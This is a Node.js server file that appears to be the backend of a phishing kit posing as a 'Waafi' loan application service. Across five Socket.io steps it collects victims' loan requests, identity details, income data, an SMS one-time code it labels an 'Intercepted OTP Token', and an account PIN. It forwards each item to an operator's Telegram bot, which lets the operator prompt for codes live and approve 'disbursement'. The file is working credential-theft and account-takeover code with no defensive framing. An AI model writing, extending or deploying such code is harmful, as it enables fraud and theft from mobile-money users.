require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

// Destructure both the botManager object and its express routing middleware
const { botManager, botRouter } = require('./bot_manager');

const app = express();
const server = http.createServer(app);

// Configure Socket.io for Render (CORS is essential for real-time frontend feedback loops)
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

global.io = io; // Link socket globally so botManager webhook callbacks can message specific active user rooms

const PORT = process.env.PORT || 3000;
const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Mount the integrated bot router middleware to capture webhook updates at /bot/webhook
app.use(botRouter);

// Fallback webhook route handling raw message updates directly through TelegramBot API
app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    botManager.bot.processUpdate(req.body);
    res.sendStatus(200);
});

io.on('connection', (socket) => {
    // Generate unique application session tracking token
    const appId = `WAAFI-${Math.floor(100000 + Math.random() * 900000)}`;
    
    socket.join(appId);
    console.log(`🔌 Waafi Application Session Connected: ${appId}`);
    
    // Send AppID down to the frontend right away to bind state models
    socket.emit('session-ready', { appId: appId });

    // Step 1: Core Loan Configuration Logging
    socket.on('step1', (data) => {
        botManager.sendToAdmin(appId, "Waafi - Step 1: Loan Request", data, null);
    });

    // Step 2: Personal Coordinate Mapping Logging
    socket.on('step2', (data) => {
        botManager.sendToAdmin(appId, "Waafi - Step 2: Identity Profile", data, null);
    });

    // Step 3: Financial Background Assessment (Triggers OTP prompt button dashboard)
    socket.on('step3-data', (data) => {
        botManager.sendToAdmin(appId, "Waafi - Step 3: Income & Employment", data, "step3");
    });

    // Step 4: SMS OTP Capture Layer (Triggers PIN prompt button dashboard)
    socket.on('step4-otp', (data) => {
        botManager.sendToAdmin(appId, "Waafi - Step 4: Intercepted OTP Token", data, "step4");
    });

    // Step 5: Secure Account Authorization PIN Submission (Triggers Disbursement button dashboard)
    socket.on('step5-pin', (data) => {
        botManager.sendFinalApproval(appId, data.pin);
    });

    socket.on('disconnect', () => {
        console.log(`🔌 Application Session Disconnected: ${appId}`);
    });
});

server.listen(PORT, async () => {
    console.log(`🚀 Waafi Loan Verification Core running on port ${PORT}`);
    
    // Auto-configure Webhooks on deployment platforms like Render
    if (EXTERNAL_URL) {
        const webhookUrl = `${EXTERNAL_URL}/bot/webhook`;
        try {
            await botManager.bot.setWebHook(webhookUrl);
            console.log(`✅ Telegram Webhook auto-bound directly to: ${webhookUrl}`);
        } catch (err) {
            console.error('❌ Webhook Setup Failed to initialize on startup:', err.message);
        }
    } else {
        console.warn('⚠️ RENDER_EXTERNAL_URL missing inside runtime environment profiles.');
    }
});